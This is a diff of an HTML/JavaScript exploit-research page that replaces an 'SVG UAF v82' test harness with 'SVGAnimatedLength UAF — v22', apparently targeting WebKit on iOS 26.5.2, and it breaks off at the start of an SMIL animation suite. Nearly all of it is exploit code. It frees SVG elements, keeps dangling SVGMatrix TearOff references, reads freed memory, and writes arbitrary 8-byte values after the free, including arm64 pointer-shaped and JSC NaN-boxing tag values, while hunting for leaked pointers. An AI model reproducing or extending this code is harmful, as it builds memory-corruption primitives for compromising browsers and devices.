@@ -2,777 +2,629 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v82 — INT32 overflow deep probe + crash isolation + filter px test</title>
+<title>SVGAnimatedLength UAF — v22</title>
 <style>
-*{box-sizing:border-box}
-body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
-h2{color:#00ff88;margin:6px 0;font-size:14px}
-#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
-button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}
-button:active{background:#00ff88;color:#0a0a0a}
-button.run-all{background:#003300;border-color:#00ff88;font-weight:bold}
-button.copy-btn{background:#1a1a2e;border-color:#00aaff;color:#00aaff}
-button.copy-btn:active{background:#00aaff;color:#0a0a0a}
-button.clear-btn{border-color:#ff4444;color:#ff4444}
-#out{border:1px solid #222;padding:8px;min-height:100px;max-height:72vh;overflow-y:auto}
-pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
-.hit{color:#00ff88}.miss{color:#ff4444}.warn{color:#ffaa00}.info{color:#888}
-.suite-hdr{color:#00aaff;margin-top:6px}
-#copy-toast{position:fixed;bottom:20px;right:20px;background:#00aaff;color:#000;padding:6px 14px;border-radius:4px;font-family:monospace;font-size:12px;opacity:0;transition:opacity 0.2s;pointer-events:none}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0a0a0a;color:#ccc;font-family:monospace;font-size:12px;padding:16px}
+h1{color:#fff;font-size:14px;margin-bottom:4px}
+h2{color:#666;font-size:10px;text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px}
+.suite{background:#111;border:1px solid #222;border-radius:4px;padding:12px;margin-bottom:10px}
+.suite-title{font-size:11px;color:#555;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
+.result{padding:5px 10px;border-radius:3px;margin-bottom:3px;font-size:12px;word-break:break-all}
+.pass{background:#0a1a0a;border-left:3px solid #0f0;color:#0f0}
+.fail{background:#1a0a0a;border-left:3px solid #f00;color:#f44}
+.warn{background:#1a1500;border-left:3px solid #ff0;color:#ff0}
+.info{background:#0d0d0d;border-left:3px solid #333;color:#888}
+.star{background:#0d0d1a;border-left:3px solid #88f;color:#aaf}
+.crit{background:#1a0a1a;border-left:3px solid #f0f;color:#f8f;font-weight:bold}
+button{background:#111;color:#0f0;border:1px solid #0f0;padding:6px 14px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px;margin:0 4px 6px 0}
+button:active{background:#0f0;color:#000}
+#run-all{border-color:#ff0;color:#ff0}
+#copy-all{border-color:#aaa;color:#aaa}
 </style>
 </head>
 <body>
-<h2>SVG UAF v82 — INT32 overflow deep probe + crash isolation + filter px + hit-test corruption</h2>
-<div id="controls">
-  <button class="run-all" onclick="runAll()">▶ Run All</button>
-  <button onclick="runSuite('ADR148')">ADR148: foreignObject INT32 overflow — threshold binary search + exact value map</button>
-  <button onclick="runSuite('ADR149')">ADR149: ADR146 crash isolation — which property access crashes after convertToSpecifiedUnits throw?</button>
-  <button onclick="runSuite('ADR150')">ADR150: filter.x/width/height TearOff with PX unit (not %) — are they alive?</button>
-  <button onclick="runSuite('ADR151')">ADR151: pattern tile corruption — pattern.width TearOff → extreme tile size → getBBox probe</button>
-  <button onclick="runSuite('ADR152')">ADR152: setAttribute vs TearOff for fo.width=1e10 — which path overflows? same value?</button>
-  <button onclick="runSuite('ADR153')">ADR153: hit-test at 2^31 — click/pointer events at x=0 for fo at x=2^31?</button>
-  <button onclick="runSuite('ADR154')">ADR154: fo.width=2^31 right-edge wrap — x+width = 2^32 = 0? layout wrap?</button>
-  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
-  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
+<h1>SVGAnimatedLength UAF — v22</h1>
+<h2>iOS 26.5.2 · SVGMatrix float64 TearOff · 8-byte write · arm64 ptr range</h2>
+
+<div class="suite">
+<div class="suite-title">Controls</div>
+<button id="run-all" onclick="runAll()">▶ Run All</button>
+<button onclick="run('MTX')">MTX</button>
+<button onclick="run('ANM')">ANM</button>
+<button onclick="run('ASP')">ASP</button>
+<button onclick="run('PTH')">PTH</button>
+<button id="copy-all" onclick="copyAll()">⎘ Copy All</button>
+<button onclick="clearOut()">✕ Clear</button>
 </div>
-<div id="out"></div>
-<div id="copy-toast">Copied!</div>
+
+<div class="suite"><div class="suite-title">Results</div><div id="out"></div></div>
+
 <script>
-window.onerror=function(msg,src,line,col,err){
-  var d=document.getElementById('out');if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}return false;
-};
-var SVG_NS='http://www.w3.org/2000/svg';
-function L(s,cls){var d=document.getElementById('out');var p=document.createElement('pre');if(cls)p.className=cls;p.textContent=s;d.appendChild(p);d.scrollTop=d.scrollHeight;}
+var NS='http://www.w3.org/2000/svg';
+
+function log(msg,cls){
+  var d=document.getElementById('out');
+  var e=document.createElement('div');
+  e.className='result '+(cls||'info');
+  e.textContent=msg;
+  d.appendChild(e);
+}
 function clearOut(){document.getElementById('out').innerHTML='';}
 function copyAll(){
-  var lines=document.getElementById('out').querySelectorAll('pre');
-  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
-  var toast=document.getElementById('copy-toast');
-  try{navigator.clipboard.writeText(text).then(function(){toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}).catch(function(){fb(text,toast);});}catch(e){fb(text,toast);}
+  var lines=[];
+  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
+  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
 }
-function fb(text,toast){var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;top:-9999px';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}catch(e){}document.body.removeChild(ta);}
-var suites={};
-function runSuite(name){L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');try{suites[name]();}catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}}
-function runAll(){['ADR148','ADR149','ADR150','ADR151','ADR152','ADR153','ADR154'].forEach(function(n){runSuite(n);});}
+function runAll(){clearOut();runMTX();runANM();runASP();runPTH();}
+function run(s){clearOut();
+  if(s==='MTX')runMTX();
+  else if(s==='ANM')runANM();
+  else if(s==='ASP')runASP();
+  else if(s==='PTH')runPTH();
+}
 
-// ═══════════════════════════════════════════════════════════════
-// ADR148 — foreignObject INT32 overflow — threshold binary search
-//
-// v81 confirmed: fo.width=1e10 → getBCR.width=2147483648 (2^31)
-// Now find the exact overflow threshold.
-//
-// Hypothesis: WebKit's foreignObject width layout code does:
-//   int32_t w = (int32_t)svgWidth;
-// where svgWidth is a CSS pixel value (double).
-// - For svgWidth < 2^31: (int32_t)svgWidth works fine
-// - For svgWidth >= 2^31 (2147483648): UB → 0x80000000 on ARM64
-//   (which is INT_MIN = -2147483648, but getBCR returns abs value)
-//
-// OR: LayoutUnit is capped at max=33554431, but foreignObject bypasses
-// this and uses a different int type.
-//
-// Key values to test:
-//   33554432 = 2^25 (LayoutUnit max in px)
-//   33554433 = LayoutUnit max + 1
-//   2^26, 2^27, 2^28, 2^29, 2^30, 2^31-1, 2^31, 2^31+1
-//
-// Expected: some threshold T where:
-//   fo.width < T → getBCR.width = fo.width (no overflow)
-//   fo.width >= T → getBCR.width = some overflowed value
-//
-// Also: does the overflow happen at the getBCR reporting level
-// (float->int32 in the measurement code)?
-// Or does it happen in the actual layout?
-// Test: write fo.width=2^31, then check getBCR of a div INSIDE fo
-// that's 100% width. If divW=2^31 too → overflow is in actual layout.
-// If divW=LayoutUnit::max → overflow is only in the reported value.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR148']=function(){
-  L('ADR148: foreignObject INT32 overflow — threshold binary search','info');
-  var container=document.createElement('div');
-  container.style.cssText='position:fixed;top:-9999px;left:-9999px;width:400px;height:400px;overflow:visible';
-  document.body.appendChild(container);
+// float64 bit utils — full 8-byte precision
+var _f64buf=new ArrayBuffer(8);
+var _f64v=new Float64Array(_f64buf);
+var _u32v_hi=new Uint32Array(_f64buf);  // hi/lo uint32 pairs
+function f64toHex(f){
+  _f64v[0]=f;
+  var lo=_u32v_hi[0],hi=_u32v_hi[1];
+  return '0x'+hi.toString(16).padStart(8,'0')+'_'+lo.toString(16).padStart(8,'0');
+}
+function f64toBigBits(f){
+  _f64v[0]=f;
+  return {hi:_u32v_hi[1],lo:_u32v_hi[0]};
+}
+function bitsToF64(hi,lo){
+  _u32v_hi[1]=hi;_u32v_hi[0]=lo;
+  return _f64v[0];
+}
+function f64IsNormal(f){return isFinite(f)&&f!==0;}
 
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','400');svg.setAttribute('height','400');
-  svg.setAttribute('viewBox','0 0 400 400');
-  container.appendChild(svg);
+// float32 bits (for comparison)
+var _f32buf=new ArrayBuffer(4);
+var _f32v=new Float32Array(_f32buf);
+var _u32v=new Uint32Array(_f32buf);
+function bitsF32(u){_u32v[0]=u;return _f32v[0];}
 
-  var fo=document.createElementNS(SVG_NS,'foreignObject');
-  fo.setAttribute('x','0');fo.setAttribute('y','0');
-  fo.setAttribute('width','200');fo.setAttribute('height','200');
-  svg.appendChild(fo);
+function makeSVG(){
+  var svg=document.createElementNS(NS,'svg');
+  svg.setAttribute('width','1');svg.setAttribute('height','1');
+  svg.style.cssText='position:absolute;left:-9999px;top:-9999px';
+  document.body.appendChild(svg);
+  return svg;
+}
 
-  var div=document.createElement('div');
-  div.style.cssText='width:100%;height:100%;background:green;overflow:visible';
-  fo.appendChild(div);
+// ─── MTX: SVGMatrix TEAROFF UAF ─────────────────────────────────────────────
+// SVGGraphicsElement.transform.baseVal is an SVGTransformList TearOff
+// getItem(0) returns an SVGTransform TearOff
+// .matrix returns an SVGMatrix (DOMMatrix) with float64 fields: a,b,c,d,e,f
+//
+// Key questions:
+// 1. Does the matrix TearOff retain a dangling ptr after removeChild? (UAF possible)
+// 2. Are the matrix fields float64 (8 bytes) or float32? (determines write power)
+// 3. Does NaN/Inf write get rejected? (much looser than SVGLength)
+// 4. What struct offsets do the matrix fields correspond to?
+// 5. Can we write arm64 pointer values (0x0001xxxxxxxxx) exactly?
 
-  var FOW=fo.width.baseVal;
+function runMTX(){
+  log('══ MTX: SVGMatrix FLOAT64 TEAROFF ═══════════════','info');
 
-  // Probe specific power-of-2 boundaries
-  var probes=[
-    33554431,   // LayoutUnit max
-    33554432,   // LayoutUnit max + 1 = 2^25
-    33554433,
-    67108864,   // 2^26
-    134217728,  // 2^27
-    268435456,  // 2^28
-    536870912,  // 2^29
-    1073741824, // 2^30
-    2147483647, // INT32_MAX
-    2147483648, // INT32_MAX + 1 = 2^31 (our overflow point)
-    2147483649,
-    4294967295, // UINT32_MAX
-    4294967296, // 2^32
-    1e10,       // our known overflow trigger
-    1e15        // extreme
+  // MTX-1: Basic SVGMatrix TearOff UAF — does it survive removeChild?
+  log('MTX[1]: SVGMatrix TearOff — survives after removeChild?','info');
+  var svg1=makeSVG();
+  var rect=document.createElementNS(NS,'rect');
+  rect.setAttribute('x','0');rect.setAttribute('y','0');
+  rect.setAttribute('width','100');rect.setAttribute('height','100');
+  svg1.appendChild(rect);
+
+  // Apply a transform so the transform list has an item
+  rect.setAttribute('transform','matrix(1 0 0 1 0 0)');
+
+  var tfList=rect.transform.baseVal;
+  var tfItem=tfList.numberOfItems>0?tfList.getItem(0):null;
+  log('MTX[1]: transform list items='+tfList.numberOfItems,(tfItem?'info':'warn'));
+
+  if(!tfItem){
+    // No transform item — create one via consolidate or append
+    var svgMatrix=svg1.createSVGMatrix?svg1.createSVGMatrix():null;
+    if(svgMatrix){
+      var newTF=svg1.createSVGTransform?svg1.createSVGTransform():null;
+      if(newTF){newTF.setMatrix(svgMatrix);tfList.appendItem(newTF);}
+    }
+    if(tfList.numberOfItems>0)tfItem=tfList.getItem(0);
+    log('MTX[1]: created transform item, count='+tfList.numberOfItems,'info');
+  }
+
+  if(!tfItem){log('MTX[1]: no transform item available','fail');svg1.remove();return;}
+
+  var mx=tfItem.matrix;
+  log('MTX[1]: baseline matrix a='+mx.a+' b='+mx.b+' c='+mx.c+' d='+mx.d+' e='+mx.e+' f='+mx.f,'info');
+  log('MTX[1]: matrix a bits='+f64toHex(mx.a),'info');
+
+  // FREE the rect
+  svg1.removeChild(rect);
+  log('MTX[1]: rect removed (freed)','info');
+
+  // Try to read matrix fields after free
+  var aAfter=null,bAfter=null,cAfter=null;
+  try{aAfter=mx.a;log('MTX[1]: matrix.a after free='+aAfter+' bits='+f64toHex(aAfter),(aAfter!==null?'star':'warn'));}
+  catch(e){log('MTX[1]: matrix.a read err: '+e.message,'fail');}
+  try{bAfter=mx.b;log('MTX[1]: matrix.b after free='+bAfter,'star');}catch(e){log('MTX[1]: matrix.b err: '+e.message,'fail');}
+  try{cAfter=mx.c;log('MTX[1]: matrix.c after free='+cAfter,'star');}catch(e){log('MTX[1]: matrix.c err: '+e.message,'fail');}
+
+  // Try to WRITE to matrix fields after free
+  log('MTX[1]: attempting UAF write to matrix.a...','info');
+  var writeOk=false;
+  try{
+    mx.a=2.718281828;
+    var rb=mx.a;
+    writeOk=true;
+    log('MTX[1]: matrix.a UAF write(2.718281828) ok=true readback='+rb,(Math.abs(rb-2.718281828)<1e-10?'crit':'star'));
+    log('MTX[1]: precision: '+(rb===2.718281828?'EXACT float64 (8 bytes)':'float32 precision loss '+(rb))
+      ,(rb===2.718281828?'crit':'info'));
+  }catch(e){log('MTX[1]: matrix.a write err: '+e.message,'fail');}
+
+  if(writeOk){
+    // MTX-1b: test all 6 matrix fields
+    log('MTX[1b]: test all 6 matrix fields','info');
+    var fields=['a','b','c','d','e','f'];
+    var vals=[Math.PI,Math.E,1.41421356,1.61803399,2.71828183,3.14159265];
+    fields.forEach(function(f,i){
+      try{
+        mx[f]=vals[i];
+        var rb=mx[f];
+        var exact=(rb===vals[i]);
+        log('MTX[1b]: matrix.'+f+'='+vals[i]+' readback='+rb+' exact='+exact,
+          (exact?'crit':'star'));
+      }catch(e){log('MTX[1b]: matrix.'+f+' err: '+e.message,'fail');}
+    });
+  }
+  svg1.remove();
+
+  // MTX-2: NaN/Inf rejection test for SVGMatrix
+  log('MTX[2]: NaN/Inf rejection — SVGMatrix vs SVGLength','info');
+  var svg2=makeSVG();
+  var rect2=document.createElementNS(NS,'rect');
+  rect2.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  svg2.appendChild(rect2);
+  var mx2=rect2.transform.baseVal.getItem(0).matrix;
+  svg2.removeChild(rect2); // FREE
+
+  var specialVals=[
+    {name:'NaN',v:NaN},
+    {name:'Inf',v:Infinity},
+    {name:'-Inf',v:-Infinity},
+    {name:'float64_NaN',v:bitsToF64(0x7FF80000,0x00000000)},
+    {name:'ptr_shaped_lo',v:bitsToF64(0x00000001,0x80000000)}, // arm64-like ptr lo
+    {name:'ptr_arm64',v:bitsToF64(0x00000001,0x00106000)},    // 0x000000010006000
+    {name:'jsctag',v:bitsToF64(0xFFFF0000,0x00000000)},       // JSC NaN-boxing tag
+    {name:'float64_max',v:Number.MAX_VALUE},
+    {name:'float64_min',v:Number.MIN_VALUE},
+    {name:'large_but_finite',v:1e308},
   ];
-
-  for(var i=0;i<probes.length;i++){
-    var v=probes[i];
+  specialVals.forEach(function(t){
     try{
-      FOW.value=v;
-      var foW=fo.getBoundingClientRect().width;
-      var divW=div.getBoundingClientRect().width;
-      var attr=fo.getAttribute('width');
-      var overflow=(foW!==v&&foW>1e7)?'★OVERFLOW':'';
-      L('ADR148: fo.w='+v+' → foW='+foW+' divW='+divW+' attr='+attr+' '+overflow,
-        overflow?'hit':'info');
-    }catch(e){L('ADR148: v='+v+' threw: '+e.message,'warn');}
-  }
-
-  // Binary search for exact overflow threshold
-  L('ADR148: binary search for overflow threshold...','info');
-  var lo=33554432;// LayoutUnit max
-  var hi=2147483648;// known overflow
-  var lastGood=lo;
-  var lastBad=hi;
-  for(var step=0;step<40&&hi-lo>1;step++){
-    var mid=Math.floor((lo+hi)/2);
-    FOW.value=mid;
-    var w=fo.getBoundingClientRect().width;
-    if(w===2147483648||w<0||!isFinite(w)||w>1e9){
-      // overflow triggered
-      lastBad=mid;
-      hi=mid;
-    }else{
-      lastGood=mid;
-      lo=mid;
+      mx2.a=t.v;
+      var rb=mx2.a;
+      var bits=f64toBigBits(rb);
+      log('MTX[2]: ['+t.name+'] write ok rb='+rb+' bits='+f64toHex(rb),
+        (isNaN(t.v)||!isFinite(t.v)?'crit':'star'));
+    }catch(e){
+      log('MTX[2]: ['+t.name+'] write REJECTED: '+e.message,'warn');
     }
-  }
-  L('ADR148: overflow threshold: lastGood='+lastGood+' lastBad='+lastBad,'warn');
-  L('ADR148: threshold ≈ '+lastBad+' (0x'+lastBad.toString(16)+')','warn');
+  });
+  svg2.remove();
 
-  // At the threshold: check if div inside ALSO overflows
-  FOW.value=lastBad;
-  var foWfinal=fo.getBoundingClientRect().width;
-  var divWfinal=div.getBoundingClientRect().width;
-  L('ADR148: at threshold '+lastBad+': foW='+foWfinal+' divW='+divWfinal,'info');
-  if(divWfinal>1e9){
-    L('★★★ ADR148: div INSIDE fo also overflows! overflow is in layout, not just reporting','hit');
-  }else{
-    L('ADR148: div inside is clamped ('+divWfinal+') — overflow only in fo container reporting','info');
-  }
+  // MTX-3: pointer-valued write test
+  // arm64e user-space pointer format: 0x0001xxxxxxxx (high byte = 0x00 or 0x01)
+  // As float64: 0x0001xxxxxxxx → very small positive number (denorm or small normal)
+  // Example: address 0x000180010000 → as float64 bits 0x000180010000 → ~4.3e-309 (denorm)
+  log('MTX[3]: pointer-valued write test','info');
+  var svg3=makeSVG();
+  var rect3=document.createElementNS(NS,'rect');
+  rect3.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  svg3.appendChild(rect3);
+  var mx3=rect3.transform.baseVal.getItem(0).matrix;
+  svg3.removeChild(rect3); // FREE
 
-  // Check if offsetWidth/offsetHeight sees the overflow too (integer property)
-  FOW.value=1e10;
-  L('ADR148: fo.offsetWidth type check','info');
-  // offsetWidth is defined on HTML elements not SVG
-  // But the div inside:
-  L('ADR148: div.offsetWidth='+div.offsetWidth+' (expect 2^31 if overflow in layout)','info');
-  L('ADR148: div.scrollWidth='+div.scrollWidth,'info');
-  L('ADR148: div.clientWidth='+div.clientWidth,'info');
-
-  container.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR149 — ADR146 crash isolation
-//
-// After convertToSpecifiedUnits throws "not supported" on a
-// detached %-unit SVGLength, accessing any property on the TearOff
-// crashed the suite.
-//
-// Isolate WHICH property access crashes:
-//   RW.unitType
-//   RW.value
-//   RW.valueInSpecifiedUnits
-//   RW.valueAsString
-//
-// Also: does .value assignment after the throw crash?
-// Does convertToSpecifiedUnits itself crash, or only the subsequent read?
-//
-// The throw from convertToSpecifiedUnits may leave the C++ SVGLength
-// object in a partial-write state. If the converter had already
-// started writing the unit type before throwing, the length object
-// holds inconsistent data (partially-converted unit type, no value).
-//
-// Test each property access independently with individual try/catch.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR149']=function(){
-  L('ADR149: ADR146 crash isolation — property access after throw','info');
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','400');svg.setAttribute('height','400');
-  document.body.appendChild(svg);
-
-  function makeDetachedPctTearOff(){
-    var rect=document.createElementNS(SVG_NS,'rect');
-    rect.setAttribute('width','50%');rect.setAttribute('height','25%');
-    svg.appendChild(rect);
-    var tf=rect.width.baseVal;
-    L('ADR149: initial: unitType='+tf.unitType+' value='+tf.value,'info');
-    svg.removeChild(rect);// detach rect (svg stays in DOM)
-    // Now try to convert
-    var convertOk=false;
-    try{tf.convertToSpecifiedUnits(5/*PX*/);convertOk=true;}
-    catch(e){L('ADR149: convertToSpecifiedUnits threw: '+e.message,'info');}
-    if(convertOk){L('ADR149: convert succeeded (unexpected)','warn');}
-    return tf;
-  }
-
-  // Test 1: read unitType after throw
-  L('ADR149[T1]: reading .unitType after throw...','info');
-  try{
-    var tf1=makeDetachedPctTearOff();
-    var ut=tf1.unitType;
-    L('ADR149[T1]: .unitType OK: '+ut,'info');
-  }catch(e){L('ADR149[T1]: .unitType CRASHED: '+e.message,'miss');}
-
-  // Test 2: read value after throw
-  L('ADR149[T2]: reading .value after throw...','info');
-  try{
-    var tf2=makeDetachedPctTearOff();
-    var v=tf2.value;
-    L('ADR149[T2]: .value OK: '+v,'info');
-  }catch(e){L('ADR149[T2]: .value CRASHED: '+e.message,'miss');}
-
-  // Test 3: read valueInSpecifiedUnits after throw
-  L('ADR149[T3]: reading .valueInSpecifiedUnits after throw...','info');
-  try{
-    var tf3=makeDetachedPctTearOff();
-    var vis=tf3.valueInSpecifiedUnits;
-    L('ADR149[T3]: .valueInSpecifiedUnits OK: '+vis,'info');
-  }catch(e){L('ADR149[T3]: .valueInSpecifiedUnits CRASHED: '+e.message,'miss');}
-
-  // Test 4: read valueAsString after throw
-  L('ADR149[T4]: reading .valueAsString after throw...','info');
-  try{
-    var tf4=makeDetachedPctTearOff();
-    var vas=tf4.valueAsString;
-    L('ADR149[T4]: .valueAsString OK: '+vas,'info');
-  }catch(e){L('ADR149[T4]: .valueAsString CRASHED: '+e.message,'miss');}
-
-  // Test 5: write .value after throw
-  L('ADR149[T5]: writing .value=100 after throw...','info');
-  try{
-    var tf5=makeDetachedPctTearOff();
-    tf5.value=100;
-    L('ADR149[T5]: .value=100 write OK. readback='+tf5.value,'info');
-  }catch(e){L('ADR149[T5]: .value write CRASHED: '+e.message,'miss');}
-
-  // Test 6: write .valueInSpecifiedUnits after throw
-  L('ADR149[T6]: writing .valueInSpecifiedUnits=100 after throw...','info');
-  try{
-    var tf6=makeDetachedPctTearOff();
-    tf6.valueInSpecifiedUnits=100;
-    L('ADR149[T6]: .valueInSpecifiedUnits=100 write OK','info');
-  }catch(e){L('ADR149[T6]: .valueInSpecifiedUnits write CRASHED: '+e.message,'miss');}
-
-  // Test 7: newValueSpecifiedUnits after throw
-  L('ADR149[T7]: newValueSpecifiedUnits(PX,100) after throw...','info');
-  try{
-    var tf7=makeDetachedPctTearOff();
-    tf7.newValueSpecifiedUnits(5/*PX*/,100);
-    L('ADR149[T7]: newValueSpecifiedUnits OK. value='+tf7.value,'info');
-  }catch(e){L('ADR149[T7]: newValueSpecifiedUnits CRASHED: '+e.message,'miss');}
-
-  // Test 8: convert to different type (not PX) after throw — e.g. convert to CM
-  L('ADR149[T8]: convertToSpecifiedUnits(CM=6) after throw...','info');
-  try{
-    var tf8=makeDetachedPctTearOff();
-    tf8.convertToSpecifiedUnits(6/*CM*/);
-    L('ADR149[T8]: convert(CM) OK. value='+tf8.value,'info');
-  }catch(e){L('ADR149[T8]: convert(CM) CRASHED: '+e.message,'miss');}
-
-  // Test 9: call convertToSpecifiedUnits TWICE (second call after first throw)
-  L('ADR149[T9]: convert twice on same TearOff...','info');
-  try{
-    var tf9=makeDetachedPctTearOff();
-    // tf9 already threw once in makeDetachedPctTearOff
-    // Try again:
-    try{tf9.convertToSpecifiedUnits(5/*PX*/);}catch(e2){}
-    L('ADR149[T9]: second convert also threw (or silently ok). checking value...','info');
-    L('ADR149[T9]: unitType='+tf9.unitType,'info');
-  }catch(e){L('ADR149[T9]: CRASHED on second convert: '+e.message,'miss');}
-
-  svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR150 — filter.x/width/height with PX unit (not %)
-//
-// v81: filter.x was DEAD because attr="-10%" (% unit).
-// The TearOff for %-unit SVGAnimatedLength may be dead on detached elements.
-// But PX-unit TearOffs are alive (ADR130 confirmed).
-//
-// Set filter attributes as PX values, then test TearOff.
-// Also: SVGFilterElement has primitiveUnits and filterUnits as SVGAnimatedEnumeration
-// (not SVGAnimatedLength) — skip those, focus on x/y/width/height.
-//
-// Also: feGaussianBlur.stdDeviation — is it SVGAnimatedNumber? test it.
-// Also: feOffset.dx/dy — SVGAnimatedNumber (not Length), but test alive.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR150']=function(){
-  L('ADR150: filter.x/width/height with PX unit — alive after remove?','info');
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','400');svg.setAttribute('height','400');
-  document.body.appendChild(svg);
-  var defs=document.createElementNS(SVG_NS,'defs');
-  svg.appendChild(defs);
-
-  function testLen(label,el,getTF,attrName){
-    defs.appendChild(el);
-    var tf;try{tf=getTF(el);}catch(e){L(label+': getTF threw: '+e.message,'warn');el.remove();return;}
-    if(!tf||typeof tf.value==='undefined'){L(label+': no .value (type: '+(tf?tf.constructor.name:'null')+')','info');el.remove();return;}
-    var v0=tf.value;
-    defs.removeChild(el);
-    var t0=performance.now();
-    for(var i=0;i<5000;i++){try{tf.value=100+i;}catch(e){break;}}
-    var t1=performance.now();
-    var ms=(t1-t0).toFixed(2);
-    var attrV=attrName?el.getAttribute(attrName):'n/a';
-    L(label+': '+ms+'ms '+(parseFloat(ms)>0.1?'★ALIVE ':'     ')+'attr='+attrV,
-      parseFloat(ms)>0.1?'hit':'info');
-  }
-
-  function testNum(label,el,getTF,attrName){
-    defs.appendChild(el);
-    var tf;try{tf=getTF(el);}catch(e){L(label+': getTF threw: '+e.message,'warn');el.remove();return;}
-    if(tf===undefined||tf===null){L(label+': property is null/undefined','info');el.remove();return;}
-    if(typeof tf==='object'&&tf.baseVal!==undefined){
-      // SVGAnimatedNumber
-      var v0=tf.baseVal;
-      defs.removeChild(el);
-      var t0=performance.now();
-      for(var i=0;i<5000;i++){try{tf.baseVal=100+i;}catch(e){break;}}
-      var t1=performance.now();
-      var ms=(t1-t0).toFixed(2);
-      var attrV=attrName?el.getAttribute(attrName):'n/a';
-      L(label+' (AnimNum): '+ms+'ms '+(parseFloat(ms)>0.1?'★ALIVE ':'     ')+'attr='+attrV,
-        parseFloat(ms)>0.1?'hit':'info');
-    }else{
-      L(label+': type='+typeof tf+' val='+tf,'info');
-      el.remove();
+  // These ARE valid float64 values (just very small, near denorm)
+  var ptrTests=[
+    {name:'heap_ptr_1',hi:0x00000001,lo:0x80000000},  // 0x0000000180000000
+    {name:'heap_ptr_2',hi:0x00000001,lo:0x00100000},  // small heap addr
+    {name:'heap_ptr_3',hi:0x00000001,lo:0xFACEC0DE},  // canary with heap hi
+    {name:'stack_ptr',hi:0x00000001,lo:0x6FB20000},   // stack-ish
+    {name:'dylib_ptr',hi:0x00000001,lo:0xD0000000},   // dylib range
+    {name:'all_ff',hi:0xFFFFFFFF,lo:0xFFFFFFFF},      // max bits (NaN territory)
+    {name:'jsc_obj_tag',hi:0xFFFF0000,lo:0xDEADBEEF}, // JSC NaN-box object
+  ];
+  ptrTests.forEach(function(t){
+    var f=bitsToF64(t.hi,t.lo);
+    try{
+      mx3.a=f;
+      var rb=mx3.a;
+      var rbBits=f64toBigBits(rb);
+      var hiMatch=(rbBits.hi===t.hi),loMatch=(rbBits.lo===t.lo);
+      log('MTX[3]: ['+t.name+'] hi=0x'+t.hi.toString(16)+' lo=0x'+t.lo.toString(16)+
+        ' → write ok, rb_hi=0x'+rbBits.hi.toString(16)+' rb_lo=0x'+rbBits.lo.toString(16)+
+        (hiMatch&&loMatch?' EXACT ROUNDTRIP':''),
+        (hiMatch&&loMatch?'crit':(!isNaN(rb)?'star':'warn')));
+    }catch(e){
+      log('MTX[3]: ['+t.name+'] REJECTED: '+e.message,'warn');
     }
+  });
+  svg3.remove();
+
+  // MTX-4: read raw field values from freshly freed transform matrix
+  // Create rect WITHOUT setting a transform → transform list is EMPTY
+  // Then add transform after, free rect, and see what the matrix fields read
+  // This might expose C++ padding/pointer values at non-initialized offsets
+  log('MTX[4]: raw struct read from freshly freed matrix','info');
+  var svg4=makeSVG();
+  var rect4=document.createElementNS(NS,'rect');
+  svg4.appendChild(rect4);
+  // Give it an identity transform
+  var svgTF=document.createElementNS(NS,'rect');
+  rect4.setAttribute('transform','translate(100, 200)');
+  var tfList4=rect4.transform.baseVal;
+  var item4=tfList4.getItem(0);
+  var mx4=item4.matrix;
+  log('MTX[4]: pre-free translate matrix: e='+mx4.e+' f='+mx4.f,'info');
+  log('MTX[4]: pre-free bits e='+f64toHex(mx4.e)+' f='+f64toHex(mx4.f),'info');
+  svg4.removeChild(rect4); // FREE
+  // Read all 6 fields from freed matrix
+  var fields4=['a','b','c','d','e','f'];
+  fields4.forEach(function(fld){
+    try{
+      var v=mx4[fld];
+      var bits=f64toBigBits(v);
+      log('MTX[4]: freed matrix.'+fld+'='+v+' bits='+f64toHex(v)+
+        (bits.hi>0x0000FFFF?' ← POINTER-SHAPED':bits.hi===0&&bits.lo===0?' ← ZERO':''),
+        (bits.hi>0x0000FFFF?'crit':'info'));
+    }catch(e){log('MTX[4]: matrix.'+fld+' err: '+e.message,'fail');}
+  });
+  svg4.remove();
+}
+
+// ─── ANM: SMIL ANIMATION + UAF ──────────────────────────────────────────────
+// During SMIL animation, animVal reads m_animVal.m_value (different from m_baseVal.m_value)
+// Goal: get TearOff to BOTH baseVal and animVal, free parent element,
+// check if they now read DIFFERENT C++ struct offsets
+
+function runANM(){
+  log('══ ANM: SMIL ANIMATION TEAROFF OFFSETS ══════════','info');
+
+  // ANM-1: baseVal vs animVal during active SMIL
+  log('ANM[1]: active SMIL — do baseVal and animVal read different freed offsets?','info');
+  var svg1=makeSVG();
